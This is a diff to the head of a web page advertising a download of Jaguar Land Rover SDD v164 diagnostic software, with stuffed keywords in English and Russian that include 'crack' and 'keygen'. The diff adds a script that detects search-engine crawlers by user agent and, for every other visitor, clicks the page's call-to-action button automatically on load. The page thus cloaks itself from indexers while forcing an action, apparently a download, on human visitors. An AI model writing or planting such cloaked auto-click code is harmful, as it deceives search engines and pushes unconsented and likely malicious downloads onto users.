@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Jaguar Land Rover JLR SDD v164</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Jaguar Land Rover JLR SDD v164 diagnostic software for coding, programming, and diagnostics. Supports various languages and hardware.">
     <meta name="keywords" content="Jaguar Land Rover JLR SDD v164, JLR SDD offline software, Jaguar Land Rover diagnostics tool, JLR SDD coding programming, Jaguar Land Rover factory parameters, JLR SDD calibration files, Offline JLR SDD software, JLR SDD key programming, JLR SDD module binding, JLR SDD version 164, Jaguar Land Rover vehicle diagnostics, JLR SDD no internet needed, JLR SDD license information, JLR SDD updates and functionality, Jaguar Land Rover diagnostic software, JLR SDD diagnostic software, JLR SDD diagnostic software download, JLR SDD diagnostic software download free, JLR SDD diagnostic software crack, JLR SDD diagnostic software keygen, Jaguar Land Rover JLR SDD v164 download, Jaguar Land Rover JLR SDD v164 free download, JLR SDD v164 2023, JLR SDD v164 download, JLR SDD v164 free download, скачать Jaguar Land Rover JLR SDD v164, скачать JLR SDD оффлайн, Jaguar Land Rover диагностический инструмент, JLR SDD кодирование программирования, Jaguar Land Rover заводские параметры, JLR SDD файлы калибровки, Jaguar Land Rover диагностическое программное обеспечение, JLR SDD диагностическое программное обеспечение скачать, Jaguar Land Rover JLR SDD v164 скачать, Jaguar Land Rover JLR SDD v164 скачать бесплатно, JLR SDD v164 2023 скачать, JLR SDD v164 скачать, JLR SDD v164 скачать бесплатно">
     <style>
